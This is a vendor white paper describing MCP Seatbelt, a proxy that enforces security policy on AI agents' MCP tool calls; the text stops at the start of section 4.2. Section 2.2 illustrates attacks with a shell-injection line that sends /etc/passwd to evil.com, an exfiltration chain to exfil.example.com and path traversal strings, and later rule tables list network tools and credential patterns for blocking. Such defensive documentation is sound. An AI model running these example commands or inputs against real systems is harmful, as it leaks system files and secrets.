# MCP Seatbelt: Protocol-Layer Runtime Security for AI Agent Tool Calls

**A Technical White Paper**

**Version 1.0 — July 2025**

**Abstract:** The Model Context Protocol (MCP) has become the dominant interface between AI coding agents and the systems they control — filesystems, shells, databases, APIs, and network services. With over 47,000 MCP-related repositories on GitHub, the attack surface has grown far beyond what static scanners, network firewalls, or generic API gateways can address. MCP Seatbelt is an open-source protocol-layer security proxy that enforces defense-in-depth on every JSON-RPC 2.0 tool call between an AI agent and its MCP servers. This paper describes the threat landscape, the architecture of Seatbelt's 12-stage request pipeline, its defense-in-depth capabilities across five security layers, deployment models from local development to air-gapped enterprise production, and the vision for a complete MCP security lifecycle when combined with pre-install scanning from mcp-observatory.

> **TL;DR**
>
> MCP Seatbelt is a **protocol-layer security proxy** for AI agent tool calls. It sits between agents (Cursor, Claude, Codex) and MCP servers (filesystem, shell, APIs) and inspects every JSON-RPC request against policies you define. Think "Web Application Firewall, but for MCP."
>
> - **Pre-execution gates:** schema validation, path safety, policy engine, RBAC, argument scoping
> - **Real-time intelligence:** threat intel IOC lookup, LLM-as-judge semantic analysis, honeytoken detection, attack chain state machine
> - **Post-execution protection:** response DLP (6 secret patterns), forensic capture (.mcpcap.json), HMAC-signed audit trail
> - **Governance:** OWASP LLM Top 10 mapping, SOC2/HIPAA/GDPR/ISO 27001/PCI-DSS compliance tags
> - **Operations:** live dashboard, webhook notifications, hot reload, per-call timeouts, circuit breaker, rate limiting
>
> Combined with [mcp-observatory](https://github.com/KryptosAI/mcp-observatory) for pre-install scanning, it's the only open-source platform that covers the full MCP security lifecycle.

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [The Problem: Why MCP Needs Runtime Security](#2-the-problem-why-mcp-needs-runtime-security)
3. [Architecture](#3-architecture)
4. [Defense-in-Depth Capabilities](#4-defense-in-depth-capabilities)
5. [Integration with mcp-observatory](#5-integration-with-mcp-observatory)
6. [Deployment Models](#6-deployment-models)
7. [Security Model](#7-security-model)
8. [Compliance & Standards](#8-compliance--standards)
9. [Roadmap to the Vision](#9-roadmap-to-the-vision)
10. [Conclusion](#10-conclusion)

> **Reader's Guide**
>
> - **CTOs / VPs of Engineering:** Sections [1](#1-executive-summary), [7](#7-security-model), [9](#9-roadmap-to-the-vision)
> - **Security Engineers:** Sections [2](#2-the-problem), [3](#3-architecture), [4](#4-defense-in-depth-capabilities), [5](#5-integration-with-mcp-observatory)
> - **Compliance Officers:** Sections [4.4](#44-layer-4--governance), [8](#8-compliance--standards)
> - **DevOps / Platform Teams:** Sections [6](#6-deployment-models), [4.5](#45-layer-5--operations)
> - **Competitive Evaluators:** [Competitive Landscape](#competitive-landscape) (below)

---

## 1. Executive Summary

The Model Context Protocol ecosystem has exploded. CI/CD pipelines routinely connect AI agents to MCP servers that expose shell interpreters, filesystem write access, environment variables containing production secrets, and unrestricted network egress. Yet the security tooling available to organizations deploying MCP-enabled agents consists almost entirely of static scanners — tools that audit source code, check dependency manifests, and produce reports. Static scanners tell you that a server *looks* risky. They do not stop a single tool call at runtime.

The gap is structural. MCP communication occurs over JSON-RPC 2.0 at the application layer. Network firewalls inspect TCP headers and IP addresses — they cannot parse tool call arguments for path traversal payloads, credential exfiltration patterns, or multi-step attack chains. API gateways understand REST semantics but have no concept of MCP tool schemas, agent identity, or the relationship between subsequent tool calls that together constitute an attack. What the MCP ecosystem needs is a security layer that operates at the protocol — one that understands JSON-RPC, inspects tool arguments against declared schemas, evaluates every call against configurable policy rules, and enforces decisions before the upstream server ever receives the request.

**MCP Seatbelt is that layer.** It is an open-source protocol-aware security proxy that sits transparently between AI agents and MCP servers, evaluating every JSON-RPC 2.0 tool call, resource access, and prompt request through a multi-stage defense-in-depth pipeline before forwarding. Seatbelt combines pre-execution policy enforcement, real-time threat intelligence, honeytoken-based deception, multi-step attack chain detection, and post-response data loss prevention into a single binary that can run on a developer laptop, in CI/CD, or as a production container behind a load balancer.

The vision is a complete MCP security lifecycle: **scan before you trust, enforce at runtime, audit after the fact.** MCP Seatbelt provides the runtime enforcement and audit pillars. Combined with the pre-install scanning capabilities of [mcp-observatory](https://github.com/KryptosAI/mcp-observatory), it forms the only open-source platform that covers static analysis, dynamic enforcement, and forensic audit in a unified workflow.

At the time of this writing, Seatbelt is at version 0.4.0, ships with 485 tests across 18 test suites, detects MCP configurations across 8 AI agent clients, and enforces 13 built-in risk rules backed by a configurable policy engine supporting regex pattern matching, time-windowed rules, role-based access control, and per-argument capability scoping. It has been benchmarked at sub-millisecond policy evaluation latency, supports stdio/HTTP/SSE/streamable-HTTP transports, and runs anywhere Node.js 22+ runs — from a developer MacBook to an air-gapped production cluster.

---

## 2. The Problem: Why MCP Needs Runtime Security

### 2.1 How MCP Works — and Why That's the Problem

The Model Context Protocol defines a client-server architecture where an AI agent (the client) connects to one or more MCP servers that expose capabilities as named *tools*, *resources*, and *prompts*. Communication is JSON-RPC 2.0 over three transport options:

- **stdio:** The agent spawns the MCP server as a child process, communicating over stdin/stdout. This is the most common transport for local-first tools.
- **HTTP with Server-Sent Events (SSE):** The agent connects to a remote HTTP endpoint; requests are POSTed, and responses stream back over an SSE channel.
- **Streamable HTTP:** A unified transport where a single HTTP endpoint handles both JSON responses and SSE streaming.

Each tool call is a `tools/call` JSON-RPC request containing a tool name and an `arguments` object. The server processes the request and returns a result. There is no built-in authentication, authorization, rate limiting, argument validation, or audit logging in the MCP specification itself. Security is entirely delegated to the transport layer — which, for stdio, means the kernel's process isolation and the ambient filesystem permissions of the user running the agent.

This is the fundamental problem. When you install an MCP server and connect it to Cursor or Claude Desktop, you are granting the AI agent — and, by extension, the model's reasoning — unrestricted access to every capability that server exposes. A benign prompt to "fix the config file" becomes a `write_file` call to `/etc/ssh/sshd_config`. A request to "check the logs" becomes a `run_shell` invocation of `grep`. The agent has no concept of least privilege beyond what the MCP server chooses to implement — and many servers implement none.

### 2.2 The Attack Surface

The MCP attack surface spans five dimensions:

**Tool Poisoning.** A malicious MCP server advertises a benign-sounding tool name (e.g., `read_config`) but executes a shell command or reads from `~/.aws/credentials` when invoked. Because MCP servers are typically installed from npm or PyPI without code review, the agent has no way to distinguish a legitimate tool from a poisoned one.

**Credential Exfiltration.** Tool arguments containing environment variable values, API keys, or file paths to credential stores are forwarded to the MCP server. A compromised server — or one that simply logs too aggressively — can capture `AWS_ACCESS_KEY_ID`, `GITHUB_TOKEN`, or `OPENAI_API_KEY` as they pass through.

**Path Traversal.** File-oriented tools accept `path` arguments. Without validation, `../../etc/passwd`, `C:\Windows\System32\config\SAM`, or null-byte terminated paths (`/etc/passwd\x00.jpg`) can bypass client-side checks and reach sensitive files on the host.

**Shell Injection.** Tools that wrap shell commands — `run_command`, `execute`, `bash` — pass arguments directly to a child process. A `command` argument of `ls; curl http://evil.com/exfil?d=$(cat /etc/passwd)` executes two commands, not one. The agent's prompt may be innocent; the model's output may be attacker-controlled; the shell will execute what it's given.

**Multi-Step Attack Chains.** Individual tool calls may appear harmless in isolation. A sequence of `list_directory("/etc")` → `read_file("/etc/shadow")` → `http_post("https://exfil.example.com", contents)` is a textbook recon → collection → exfiltration chain. Without stateful tracking across calls, each request passes policy evaluation independently — and the attack succeeds.

### 2.3 Why Existing Defenses Fall Short

**Static Scanners** (npm audit, Snyk, Socket, mcp-observatory) analyze source code, dependencies, and package metadata before installation. They are valuable — Seatbelt itself bridges directly to observatory findings — but they are inherently pre-execution. A scanner can flag that a server *imports* `child_process` and *could* execute shell commands. It cannot know whether the server *will* execute `rm -rf /` when the agent asks it to "clean up temporary files." And by the time a scanner's report reaches a human reviewer, the agent may have already made the call.

**Network Firewalls** operate at Layer 3/4. They inspect IP headers, TCP flags, and port numbers. They have no visibility into JSON-RPC payloads, tool names, or argument values. Blocking port 9420 at the firewall stops all MCP traffic — which also stops legitimate tool use. Allowing it passes everything through.

**API Gateways** understand HTTP semantics — methods, paths, headers, status codes. Some can inspect JSON bodies with pattern matching. But they have no concept of MCP's tool semantics (a `tools/call` for `write_file` is fundamentally different from a `tools/call` for `read_file`, even though both arrive at the same HTTP endpoint with the same method). They cannot track multi-step sequences. They cannot validate tool arguments against declared JSON Schemas. They cannot inject honeytokens into responses and detect their exfiltration.

**Generic Proxy Tools** (mcp-firewall, mcp-guardian, Prismor) provide some level of runtime blocking based on tool names or patterns. But they lack the defense-in-depth layering that Seatbelt provides: no schema validation, no threat intelligence integration, no attack chain state machines, no honeytoken deception, no forensic capture, no OWASP LLM Top 10 mapping, no compliance framework tagging, and no role-based access control.

### 2.4 The Missing Layer

What the ecosystem lacks — and what Seatbelt provides — is a **protocol-aware, policy-driven runtime enforcement proxy** that operates at Layer 7 with full understanding of MCP semantics. This layer must:

1. **Inspect** every JSON-RPC request for tool name, method, arguments, and metadata
2. **Validate** arguments against declared schemas and detect path traversal, injection, and credential patterns
3. **Authorize** the calling agent against role-based access control policies
4. **Evaluate** the request against configurable policy rules (deny, allow, warn, redact)
5. **Check** arguments against real-time threat intelligence feeds
6. **Detect** multi-step attack patterns via state machine tracking
7. **Inject** decoy credentials into responses and alert on their use
8. **Scan** upstream responses for secrets before forwarding to the agent
9. **Record** complete request/response pairs for forensic analysis
10. **Log** every decision to a signed, tamper-evident audit trail

This is the full scope of what Seatbelt delivers — not as a collection of independent tools, but as an integrated, single-binary proxy that processes every call through an ordered pipeline before the upstream MCP server ever sees it.

---

## Competitive Landscape

MCP Seatbelt occupies a unique position: protocol-aware runtime enforcement that bridges pre-install scanning and post-incident audit. Here's how it compares to alternatives:

### Feature Comparison Matrix

| Capability | MCP Seatbelt | mcp-guardian | mcp-firewall | Prismor | Snyk Code | Generic API Gateway |
|---|---|---|---|---|---|---|
| Protocol-aware (MCP/JSON-RPC) | ✓ | ✓ | ✓ | ✓ | ✗ | ✗ |
| Pre-execution policy engine | ✓ | ✓ | ✓ | ✓ | ✗ | Partial |
| Schema-aware argument validation | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Per-argument capability scoping | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Attack chain detection (multi-step) | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Threat intelligence (IOC lookup) | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Honeytoken injection & detection | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ |
| Response DLP (secret scanning) | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| LLM-as-judge semantic analysis | ✓ | ✗ | ✗ | ✓ | ✗ | ✗ |
| RBAC (per-agent identity) | ✓ | ✓ | ✗ | ✗ | ✗ | ✗ |
| OWASP LLM Top 10 mapping | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Compliance framework tagging | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Signed audit trail (HMAC) | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Forensic session capture | ✓ | ✗ | ✗ | ✗ | ✗ | ✗ |
| Live dashboard | ✓ | ✓ | ✗ | ✗ | ✗ | ✗ |
| Hot reload | ✓ | ✓ | ✗ | ✗ | ✗ | ✗ |
| Pre-install scanning (via observatory) | ✓ | ✗ | ✗ | ✗ | ✓ | ✗ |
| Open source (MIT) | ✓ | MIT | MIT | Apache 2.0 | Apache 2.0 | Varies |
| 485 tests | ✓ | 168 | ~50 | Unknown | Unknown | N/A |

### Category Analysis

**MCP-native proxies (mcp-guardian, mcp-firewall):** These tools pioneered MCP proxy security. They excel at basic allow/deny policy enforcement and transport bridging. Seatbelt extends this foundation with defense-in-depth: schema validation, threat intel, attack chain detection, honeytokens, and forensic capture — capabilities typically found only in enterprise web application firewalls.

**Runtime guards (Prismor):** Python-based, focused on command blocking and secret leak prevention. Strong at honeytoken detection. Lacks MCP protocol-level awareness, schema validation, and compliance mapping. Seatbelt's TypeScript implementation integrates natively with the Node.js MCP ecosystem.

**Static scanners (Snyk Code, Semgrep):** Excellent at finding vulnerabilities before deployment. They complement Seatbelt — use Snyk or Semgrep for code-level scanning, then use Seatbelt for runtime enforcement. The observatory integration bridges this gap: observatory scan findings import directly into seatbelt policy rules.

**API gateways (Kong, Tyk, NGINX):** Designed for REST/HTTP traffic. They can route MCP-over-HTTP requests but lack MCP protocol awareness (no JSON-RPC method inspection, no tool-call argument parsing, no schema validation against MCP tool definitions). They're network firewalls, not application-layer security proxies for MCP.

### Build vs. Buy

Building an MCP security proxy in-house requires:
- JSON-RPC 2.0 protocol parsing and proxy implementation
- stdio, HTTP, SSE, and Streamable HTTP transport support
- Policy engine with regex/exact/contains matching and time-windowed rules
- Audit trail with cryptographic signing
- CI/CD integration (SARIF, GitHub Actions)
- Dashboard and monitoring

Seatbelt provides all of this as open-source MIT-licensed software with 485 tests. The alternative is 3-6 months of engineering effort to build a subset of these capabilities from scratch.

---

## 3. Architecture

### 3.1 System Overview

Seatbelt operates as a transparent proxy between AI agents and MCP servers. From the agent's perspective, it is simply an HTTP endpoint at `localhost:9420/<server-name>`. From the MCP server's perspective, the agent's traffic arrives as normal — but only after passing through Seatbelt's security pipeline.

```
┌──────────────┐                    ┌──────────────────────────────────────────────┐                    ┌──────────────┐
│              │   JSON-RPC 2.0     │              MCP SEATBELT PROXY               │   JSON-RPC 2.0     │              │
│   AI AGENT   │ ──────────────────▶│                                              │ ──────────────────▶│  MCP SERVER  │
│  (Cursor,    │                    │  ┌──────┐ ┌──────┐ ┌──────┐     ┌──────────┐ │                    │ (filesystem, │
│   Claude,    │                    │  │Stage │→│Stage │→│Stage │→ ...→│Transport │ │                    │   shell,     │
│   Codex...)  │◀──────────────────│  │  1   │ │  2   │ │  3   │     │  Client  │ │◀──────────────────│  database)   │
│              │   JSON-RPC 2.0     │  └──────┘ └──────┘ └──────┘     │ (stdio/   │ │   JSON-RPC 2.0     │              │
└──────────────┘                    │                                  │ HTTP/SSE) │ │                    └──────────────┘
                                    │                                  └──────────┘ │
                                    │                                      │        │
                                    │                         ┌────────────▼──────┐ │
                                    │                         │   Response Pipeline│ │
                                    │                         │  (DLP → Honeytoken │ │
                                    │                         │  → Audit → Agent)  │ │
                                    │                         └───────────────────┘ │
                                    │                                              │
                                    │  Dashboard :9421    Policy Engine    Audit   │
                                    │  (Live stats)       (YAML rules)    (HMAC)   │
                                    └──────────────────────────────────────────────┘
```

### 3.2 The 12-Stage Request Pipeline

Every tool call processed by Seatbelt flows through an ordered 12-stage pipeline. Stages 1-9 operate on the inbound request before it reaches the upstream server. Stages 10-12 operate on the response before it is returned to the agent. Each stage is independent enough to be reasoned about separately, but together they form a layered defense where a threat that evades one stage is caught by the next.

```
AGENT REQUEST
     │
     ▼
┌─────────────────────────────────────────────────────────────────────────┐
│ STAGE 1: AUTHENTICATION & AUTHORIZATION                                  │
│   • Optional API key validation (Bearer token)                          │
│   • Rejects unauthenticated requests with JSON-RPC error -32003          │
│   • Configurable via --api-key flag                                     │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 2: SCHEMA VALIDATION                                              │
│   • Validates tool arguments against declared JSON Schemas (AJV)        │
│   • Detects type mismatches, missing required fields, excess properties │
│   • Catches malformed arguments before they reach policy evaluation     │
│   • Rejects with JSON-RPC error -32602 (Invalid params)                 │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 3: PATH SAFETY                                                    │
│   • Scans all string arguments for path traversal patterns              │
│   • Detects: ../ sequences, null-byte injection, absolute sensitive     │
│     paths (/etc/passwd, C:\Windows\System32, ~/.ssh/authorized_keys)    │
│   • Detects: symlink escape attempts, encoded traversal (%2e%2e%2f)     │
│   • Blocks with error -32001 on first violation                        │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 4: POLICY ENGINE                                                  │
│   • Evaluates tool name, description, and arguments against rule set    │
│   • 13 built-in risk rules + configurable custom rules                  │
│   • Supports: exact match, regex pattern, substring containment         │
│   • Supports: time-windowed rules (days of week, hour ranges)           │
│   • Supports: context conditions (client identity, request rate)        │
│   • Supports: per-argument capability scoping (constraints)             │
│   • Returns: allow, deny, warn, or redact with reasons                  │
│   • Allowlisted tools bypass all deny rules                             │
│   • Three modes: audit (log only), enforce (block), default-deny        │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 5: ROLE-BASED ACCESS CONTROL (RBAC)                               │
│   • Casbin-powered per-agent authorization                              │
│   • Agents identified via X-Agent-ID header or default identity         │
│   • Roles: admin (all tools), agent (scoped), readonly (safe only)      │
│   • Policy defined in rbac_model.conf + rbac_policy.csv                 │
│   • Denied access returns JSON-RPC error -32001                         │
│   • If no enforcer is initialized, defaults to open access              │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 6: THREAT INTELLIGENCE                                            │
│   • Extracts IPs and domains from all string arguments                  │
│   • Queries ThreatFox IOC database for known-malicious indicators       │
│   • Results cached for 1 hour; 3-second query timeout                   │
│   • Blocks if any indicator is flagged as malicious                     │
│   • Future: MISP, AlienVault OTX, OpenCTI integration                   │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 7: HONEYTOKEN DETECTION                                           │
│   • Checks all tool arguments for previously-planted decoy credentials  │
│   • Honeytoken types: AWS keys, GitHub tokens, Slack webhooks,          │
│     private keys, API keys, database connection strings                 │
│   • If a honeytoken appears in any argument, the request is blocked     │
│     with error -32001 and the detection is logged                       │
│   • Alerts: "Honeytoken <type> credential was accessed"                 │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 8: ATTACK CHAIN TRACKING                                          │
│   • XState finite state machine per session                             │
│   • States: idle → reconnaissance → execution → persistence →          │
│     exfiltration_attempt → exfiltration_confirmed                       │
│   • Transitions based on classified tool calls:                         │
│     - READ_SENSITIVE: reading /etc, passwd, shadow files                │
│     - SHELL_EXEC: bash, sh, exec, shell tools                           │
│     - WRITE_SSH: writing to .ssh/authorized_keys                        │
│     - NETWORK_CALL: HTTP fetch, curl, requests                          │
│     - LARGE_FILE_READ: reading files >1MB                               │
│     - WRITE_SYSTEM: writing to /etc, /System locations                  │
│     - EXEC_PROCESS: exec, spawn, fork operations                        │
│   • States auto-reset after 5 minutes of inactivity                     │
│   • Exfiltration confirmed → block with error -32001                    │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 9: TIMEOUT GATE & CIRCUIT BREAKER                                 │
│   • Per-call timeouts configurable per rule                             │
│   • Default: 30 seconds; shell commands: 10 seconds                     │
│   • Exceeded timeout: SIGTERM → 2s wait → SIGKILL                      │
│   • Agent receives clean JSON-RPC error, not raw 503                    │
│   • Circuit breaker: 5 consecutive failures → 30s open                  │
│   • Rate limiting: IP-based, configurable max per 60s window            │
│   • Protects upstream servers from overload and cascading failures      │
├─────────────────────────────────────────────────────────────────────────┤
│                              FORWARD TO UPSTREAM                         │
│                    (StdioClient / HttpClient / SseClient)                │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 10: RESPONSE DATA LOSS PREVENTION (DLP)                           │
│   • Deep-scans every string value in the upstream response              │
│   • 6 built-in secret patterns:                                         │
│     - AWS access keys: AKIA[0-9A-Z]{16}                                 │
│     - GitHub tokens: ghp_[0-9a-zA-Z]{36}                                │
│     - OpenAI keys: sk-[a-zA-Z0-9]{32,}                                  │
│     - Private keys: -----BEGIN ... PRIVATE KEY----- blocks              │
│     - API keys: api_key=..., bearer tokens, auth headers                │
│     - Generic secrets: password=, secret=, token= patterns              │
│   • Redacted values replaced with [REDACTED-<type>] placeholder         │
│   • All redactions logged with path, type, and count                    │
│   • Configurable via --dlp flag (default: enabled)                      │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 11: HONEYTOKEN INJECTION                                          │
│   • After DLP, before returning to agent                                │
│   • Plants synthetic decoy credentials in tool response bodies          │
│   • Types injected: AWS keys, GitHub tokens, Slack webhooks,            │
│     DB connection strings, API keys                                     │
│   • Each honeytoken is tracked with ID, type, planted-in, timestamp     │
│   • Detection on next cycle (Stage 7) triggers alert + block            │
│   • Provides active deception: if attacker exfiltrates response         │
│     data and tries to use the credential, they're caught                │
├─────────────────────────────────────────────────────────────────────────┤
│ STAGE 12: FORENSIC CAPTURE & AUDIT                                      │
│   • Records complete request/response pairs as .mcpcap.json files       │
│   • Session-based: startSessionCapture → captureRequest →               │
│     captureResponse → saveSession                                       │
│   • Files stored in .mcp-seatbelt/sessions/<uuid>.mcpcap.json           │
│   • Each entry includes timestamp, direction, and full payload          │
│   • Signed audit trail: HMAC-SHA256 chained JSONL log                   │
│   • Each entry carries _seq (monotonic) + _hmac (covers seq + payload) │
│   • verify-audit command checks integrity; tampered entries flagged     │
│   • Queryable by time range, tool name, action                          │
│   • Designed for incident response, compliance audits, and forensics    │
└─────────────────────────────────────────────────────────────────────────┘
     │
     ▼
AGENT RESPONSE
```

### 3.3 Design Decisions

Key architectural choices and their rationale:

| Decision | Alternatives Considered | Rationale |
|---|---|---|
| **AJV for schema validation** | Zod, Joi, custom | Fastest JSON Schema validator (14.8k★). Compiles schemas into optimized validation functions. Native TypeScript support. |
| **Casbin for RBAC** | OPA/Rego, Cerbos, custom | Same-language (TypeScript), zero dependencies, familiar ACL/RBAC model. OPA is on the roadmap for complex Rego-based policies. |
| **XState for attack chains** | Custom FSM, Esper, Siddhi | In-process state machine (28k★), TypeScript-native. Avoids JVM dependency while supporting hierarchical states and temporal transitions. |
| **ThreatFox for threat intel** | MISP, OpenCTI, AlienVault OTX | Free API, no infrastructure required, simple REST interface. MISP/OpenCTI integration planned for enterprise deployments with existing TI platforms. |
| **HMAC-SHA256 for audit trail** | JWT, Ed25519, plain JSONL | Industry standard, widely understood, simple verification. Each audit entry is self-verifying with no need for an external key management system. |
| **MIT license** | Apache 2.0, GPL, BSL | Maximum adoption. No restrictions on commercial use, modification, or redistribution. |
| **Node.js 22+** | Python, Go, Rust | TypeScript ecosystem, broad MCP tooling support, async I/O model well-suited for proxy workloads. |

### 3.4 Transport Abstraction

Seatbelt abstracts over four MCP transport types with a uniform `send(request, timeoutMs)` interface:

- **StdioClient** — Spawns the MCP server as a child process. Manages process lifecycle, auto-restart (up to 5 attempts), and stdin/stdout message framing via readline. Handles JSON-RPC on both stdout and stderr (some servers log JSON-RPC responses to stderr).

- **HttpClient** — POSTs JSON-RPC requests to a remote HTTP endpoint. Uses `AbortController` for timeout enforcement. Standard `Content-Type: application/json`.

- **SseClient** — Connects to SSE endpoints for streaming responses. Maintains a persistent EventSource connection, parses `data:` lines from the SSE stream, routes responses by `id` to pending callers, and handles reconnection with configurable retry logic.

- **StreamableHttpClient** — Supports the unified Streamable HTTP transport. Sends POST requests accepting both `application/json` and `text/event-stream`. If the response is SSE, decodes the stream inline to extract the JSON-RPC response.

Each transport type implements the same error-handling contract: timeouts produce clean `-32001` errors with descriptive messages, transport failures produce `-32603` internal errors, and the proxy never leaks raw upstream error details (e.g., stack traces) to the agent.

### 3.5 Policy Evaluation Engine

The `PolicyEngine` is the heart of Seatbelt. It evaluates every `tools/call`, `resources/read`, `resources/subscribe`, and `prompts/get` request against a configurable rule set and returns one of four actions:

| Action | Behavior |
|--------|----------|
| `allow` | Forward to upstream server without modification |
| `deny` | Return JSON-RPC error -32001 with reasons; do not forward |
| `warn` | Forward to upstream, but log the warning and notify webhooks |
| `redact` | Delete matching argument keys from the request, then forward |

Rules are evaluated sequentially. The first matching rule with the highest-severity action takes priority: `deny` > `warn` > `allow`. Redaction rules are evaluated first across all rules; if any argument keys match redaction patterns, those keys are stripped from the request before other rules are evaluated.

Policy configuration is YAML-native:

```yaml
version: '1'
mode: enforce
defaultAction: deny

rules:
  - id: block-shell-execution
    description: Block direct shell interpreter invocations
    target: command
    match: pattern
    values:
      - '^(bash|sh|zsh|cmd|powershell|python|node|ruby|perl)$'
    action: deny

  - id: allow-filesystem-business-hours
    description: Allow filesystem writes only during business hours
    target: file
    match: contains
    values:
      - '/workspace'
    action: allow
    timeWindow:
      days: [Monday, Tuesday, Wednesday, Thursday, Friday]
      startHour: 9
      endHour: 17

  - id: block-sensitive-paths
    description: Block writes to sensitive system paths
    target: file
    match: pattern
    values:
      - '^/(etc|root|boot|sys)/'
      - '^~(/|\.)'
    action: deny

  - id: redact-credentials
    description: Redact credential-looking argument keys
    target: env
    match: contains
    values:
      - 'token'
      - 'secret'
      - 'key'
      - 'password'
      - 'credential'
    action: redact

  - id: restrict-write-path
    description: Write tool allowed only within workspace
    target: file
    match: contains
    values:
      - 'write'
    action: deny
    argConstraints:
      - argName: path
        constraint: startsWith
        values:
          - '/home/user/projects/'
          - '/workspace/'

  - id: block-after-hours-network
    description: Block network access outside business hours
    target: network
    match: contains
    values:
      - 'http'
      - 'fetch'
      - 'curl'
    action: deny
    timeWindow:
      days: [Saturday, Sunday]

  - id: rate-limit-sensitive
    description: Rate limit credential access tools
    target: command
    match: contains
    values:
      - 'read_secret'
      - 'get_credentials'
    action: warn
    contextCondition:
      maxRequestsPerMinute: 5

allowlist:
  tools:
    - safe-read-only-tool
    - health-check
  paths:
    - /home/user/projects/
  hosts:
    - api.github.com
  envVars:
    - NODE_ENV
    - PATH
    - HOME
```

Rules support inheritance via the `extends` mechanism, allowing organizations to define base policies (e.g., `pci-compliance`, `strict-production`) and layer custom rules on top. Circular extends are detected and rejected at load time.

The behavioral baseline module (`BehavioralBaseline`) observes tool call patterns and detects anomalies — new argument keys never seen before, argument sizes exceeding 3x the historical average, and calls at hours with no prior activity. These deviations feed into policy evaluation as additional reasons, providing runtime behavioral anomaly detection without requiring explicit rules.

### 3.6 Dashboard and Observability

Seatbelt exposes a live HTML dashboard on port 9421 that displays:

- **Request stats:** total requests, blocked, allowed, warned, redacted, timed out, and honeytoken detections
- **Latency metrics:** p50, p95, p99, average, and maximum latency in milliseconds
- **Throughput:** requests per second over a rolling 5-second window
- **Connected clients:** each registered server with risk level, proxy URL, and transport type
- **Recent blocked calls:** tool name, server name, and the reason for each block
- **Auto-refresh** at configurable intervals

The `/health` endpoint returns machine-readable JSON with full stats and latency metrics, suitable for integration with Prometheus, Datadog, or custom monitoring stacks.

---

## 4. Defense-in-Depth Capabilities

Seatbelt's security capabilities are organized into five layers, from the most immediate pre-execution gates to the operational infrastructure that keeps the proxy itself reliable and observable.

### 4.1 Layer 1 — Pre-Execution Gates

These checks run before the request leaves the proxy. They are synchronous, deterministic, and designed to have negligible overhead (sub-millisecond per check in the common case).

**Schema-Aware Argument Validation.** Before policy evaluation, Seatbelt validates tool arguments against their declared JSON Schemas using AJV (Another JSON Validator). Schemas are compiled when a tool is first registered (via `tools/list` introspection) and cached for the lifetime of the proxy. Validation catches type errors, missing required fields, and excess properties before they reach any downstream system. Combined with path safety checks — which scan all string arguments for `../` traversal, null-byte injection, and sensitive absolute paths — this layer catches malformed and explicitly malicious payloads at the earliest possible point.

**Policy Engine with 13 Risk Rules.** The default policy ships with 13 built-in risk rules:

| Rule ID | Target | Severity | Description |
|---------|--------|----------|-------------|
| `shell-interpreter` | command | critical | Shell interpreters: bash, sh, zsh, cmd, powershell, python, node, ruby, perl |
| `destructive-fs` | file | high | Destructive filesystem operations: rm -rf, format, dd, shred |
| `no-sandbox` | process | critical | Sandbox bypass flags: --no-sandbox, --disable-web-security |
| `sensitive-env` | env | high | Credential exposure in environment variables |
| `remote-access` | network | medium | Remote access tools and URL access |
| `network-tool` | network | high | Raw network tools: curl, nc, telnet, wget, nslookup |
| `package-runner` | process | medium | Package runners: npx, uvx, pipx |
| `risky-package` | process | high | Risky packages in tool arguments |
| `privilege-escalation` | process | high | Privilege escalation: sudo, chmod 777, setuid |
| `docker-container` | process | high | Docker privileged containers: --privileged, -v /:/host |
| `network-transport` | network | medium | Network transport in tool configuration |
| `process-spawn` | process | high | Process spawning: child_process, exec, spawn, fork |
| `sensitive-paths` | file | medium | Sensitive filesystem paths: /etc, /root, ~/.ssh, ~/.aws, /var/run |

Each rule maps to one or more OWASP LLM Top 10 categories and compliance frameworks (see Section 8), providing automatic audit trail enrichment.

**Rule Matching Semantics.** The policy engine supports three match types:

- `exact` — The value must equal the tool name, description, or argument string exactly (case-sensitive).
- `pattern` — The value is interpreted as a JavaScript regular expression with case-insensitive flag. Tested against tool name, description, and all string arguments.
- `contains` — Case-insensitive substring match across tool name, description, and all string arguments.

**Per-Argument Capability Scoping.** Beyond tool-level allow/deny, policy rules can specify `argConstraints` that scope what values specific arguments may take. This enables fine-grained policies like:

- `write_file` is allowed, but only when `path` starts with `/workspace/`
- `read_file` is allowed, but `path` must not equal certain values (using `notIn`)
- `execute_command` is allowed, but `command` must match a regex of known-safe commands

Constraints support five operations: `equals`, `startsWith`, `regex`, `in` (allowlist), and `notIn` (denylist). A constraint failure produces a `deny` action with a descriptive reason.

**RBAC per Agent Identity.** Casbin provides role-based access control with the following model:

```
[request_definition]
r = sub, obj, act

[policy_definition]
p = sub, obj, act

[policy_effect]
e = some(where (p.eft == allow))

[matchers]
m = r.sub == p.sub && (p.obj == "*" || r.obj == p.obj) && r.act == p.act
```

Roles are defined in CSV:

```csv
p, admin-agent, *, execute
p, developer-agent, read_file, execute
p, developer-agent, write_file, execute
p, developer-agent, search_code, execute
p, readonly-agent, read_file, execute
p, readonly-agent, list_directory, execute
```

If an agent's `X-Agent-ID` header does not match any policy, or the matched policy does not grant access to the requested tool, the call is blocked with error -32001. If no RBAC enforcer is initialized, access defaults to open (fail-open for development; enterprises should initialize RBAC before production use).

### 4.2 Layer 2 — Real-Time Intelligence

These checks run before forwarding and may involve external API calls or heuristic analysis. They add latency (typically 1-3ms for cached, up to 3 seconds for external queries) but catch threats that static rules cannot.

